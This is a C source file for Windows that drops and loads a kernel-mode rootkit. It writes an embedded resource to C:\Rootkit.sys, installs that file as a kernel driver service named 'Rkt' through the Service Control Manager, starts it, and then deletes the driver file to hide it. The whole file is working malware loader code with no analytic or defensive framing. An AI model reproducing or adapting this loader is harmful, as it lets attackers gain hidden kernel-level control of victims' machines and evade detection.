#include "stdafx.h"
#include  <windows.h>
#include  "LoadDriver.h"

#pragma optimize("gsy",on)
#pragma comment(linker,"/MERGE:.data=.text /MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
#pragma comment(linker,"/ENTRY:WinMain")

PCHAR  DrvFullPathName = TEXT("C:\\Rootkit.sys");
PCHAR  DrvResourceName = TEXT("RootkitSys");
PCHAR  DriverName      = TEXT("Rkt");

#define BUF_SIZE 4096

BOOL ReleaseFileFromRes(PCHAR   FullPathName, //释放文件名(包括路径)
                        PCHAR   szResourceName) //资源名称
{
    HRSRC    hRes;             //handle to resource info. in hExe
    HGLOBAL  hResLoad;         //handle to loaded resource
    unsigned char  *lpResLock; //ptr to resource info.
    ULONG   ResSize;           //size of resource info.
    HANDLE  hFile;             //handle to the file
    DWORD   dwBytesWritten;

    //locate a named resource in the current binary .EXE file
    hRes = FindResource( NULL, szResourceName, "BINARY");
    if (hRes == NULL)
    {
        return FALSE;
    }

    //Load the Resource into global memory.
    hResLoad = LoadResource(NULL, hRes);
    if (hResLoad == NULL)
    {
        return FALSE;
    }

    ResSize = SizeofResource(NULL, hRes);

    // Lock the Resource into global memory
    lpResLock = (unsigned char *)LockResource(hResLoad);
    if ( lpResLock == NULL )
    {
        return FALSE;
    }

    hFile = CreateFile(
                FullPathName,  //资源释放路径
                FILE_ALL_ACCESS,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL);
    if ( hFile == INVALID_HANDLE_VALUE )
    {
        if ( GetLastError() == ERROR_ALREADY_EXISTS )
        {
            //文件已经存在
            return TRUE;
        }
        return FALSE;
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, lpResLock, ResSize, &dwBytesWritten, NULL);
    SetEndOfFile(hFile);
    CloseHandle(hFile);
    return TRUE;
}

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow)
{
    ReleaseFileFromRes( DrvFullPathName, DrvResourceName ); //释放文件

    //加载内核级Rootkit
	
	HANDLE SCManager = 0; 
	HANDLE service = 0;
  
    SCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    
    if (SCManager)
    {
        service = CreateService((struct SC_HANDLE__ *)SCManager, DriverName, DriverName, SERVICE_ALL_ACCESS,
                                SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,
                                DrvFullPathName, NULL,NULL,NULL,NULL,NULL);

        if (!service) // if we cannot create it, maybe he is already existing
            service = OpenService((struct SC_HANDLE__ *)SCManager,DriverName, SERVICE_ALL_ACCESS);

        if (service)
        {
            StartService((struct SC_HANDLE__ *)service, 0, NULL);
        }
        else
        {
            //printf("cannot create/open the service\n");
        }

    }
    else
    {
        //printf("cannot open the service manager\n");
    }

    //删除驱动文件
    if ( !DeleteFile(DrvFullPathName) )
    {
        //OutputDebugString("DeleteFile Error!");
    }

    return 0;
}
